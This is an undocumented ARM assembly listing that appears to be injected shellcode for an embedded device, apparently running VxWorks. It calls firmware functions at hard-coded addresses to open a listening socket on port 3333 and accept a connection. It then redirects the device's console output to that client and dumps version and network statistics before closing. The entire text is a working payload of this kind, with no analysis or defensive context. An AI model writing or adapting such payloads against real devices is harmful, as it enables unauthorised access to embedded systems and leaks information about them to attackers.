/*
LDR             R0, =_FLAG
LDRB            R1,[R0]
MOV             R2, #0xFF
CMP             R1, R2
BEQ               _END
*/
MOV             R0, #2	;AF_INET
MOV             R1, #1	;SOCK_STREAM
MOV             R2, #0	;protocol
LDR             R3, =0x201ED5B8	;socket()
MOV             LR,PC
MOV             PC,R3
SUBS            R6, R0, #0		;R6=listenfd
MOV             R0, #0x10
LDR             R3, =0x2022EADC	;malloc()
MOV             LR,PC
MOV             PC,R3
MOV             R8, R0	;sockaddr_in buffer
MOV             R1, #0x10
LDR             R3, =0x20253C1C	;bzero
MOV             LR,PC
MOV             PC,R3
MOV             R3,#02
STRB            R3,[R8]
MOV             R3,#0x0d
STRB            R3,[R8,#2]
MOV             R3,#0x05
STRB            R3,[R8,#3]
MOV             R3, #2
MOV             R1, R8	;&sockaddr_in
MOV             R2, #0x10	;size0f(sockaddr_in)=0x10
MOV             R0, R6	;listenfd
LDR             R4, =0x201ED660	;bind()
MOV             LR,PC
MOV             PC,R4
MOV             R0,R6	;listenfd
MOV             R1,#0xFF
LDR             R4, =0x201ED6FC	;listen()
MOV             LR,PC
MOV             PC,R4
MOV             R0, R6	;listenfd
MOV             R1, #0
MOV             R2, #0
LDR             R4, =0x201ED764	;Accept()
MOV             LR,PC
MOV             PC,R4
SUBS            R5, R0, #0	;R5->newclientsocket
MOV             R0, R5
LDR             R1, =0x2033BA34	;hello
MOV             R2, #7
MOV             R3, #0
LDR             R4, =0x201EDA14	;send()
MOV             LR,PC
MOV             PC,R4
/*
B               _CLEAR
*/
MOV             R0, #0
LDR             R4, =0x202239B4	;ioGlobalStdGet()
MOV             LR,PC
MOV             PC,R4
MOV             R7,R0	;R7->store oldstdout
MOV             R0, #1
MOV             R1, R5
LDR             R4, =0x20223948	;ioGlobalStdSet() set new stdout
MOV             LR,PC
MOV             PC,R4
MOV             R0,#0
LDR             R4, =0x20251A1C	;version
MOV             LR,PC
MOV             PC,R4
MOV             R0,#0
LDR             R4, =0x20251A1C	;version
MOV             LR,PC
MOV             PC,R4
LDR             R0, =0x20319AA8
LDR             R4, =0x2017DCFC	;printf \n
MOV             LR,PC
MOV             PC,R4
MOV             R0,#0
LDR             R4, =0x201B3E54	;ipstatShow
MOV             LR,PC
MOV             PC,R4
MOV             R0, #1
MOV             R1, R7
LDR             R4, =0x20223948	;ioGlobalStdSet(),restore oldstdout
MOV             LR,PC
MOV             PC,R4
_CLEAR:
MOV             R0, R5
LDR             R4, =0x20223AE8	;close newclientsocket
MOV             LR,PC
MOV             PC,R4
MOV             R0, R6
LDR             R4, =0x20223AE8	;close listenfd
MOV             LR,PC
MOV             PC,R4
MOV             R0, R8
LDR             R4, =0x2022E764	;free
MOV             LR,PC
MOV             PC,R4
/*
MOV             R0, #0xFF
LDR             R1, =_FLAG
STRB            R0, [R1]
*/
B               _END
_FLAG:
MOV             R0, R0
_END:
MOV             R0, R0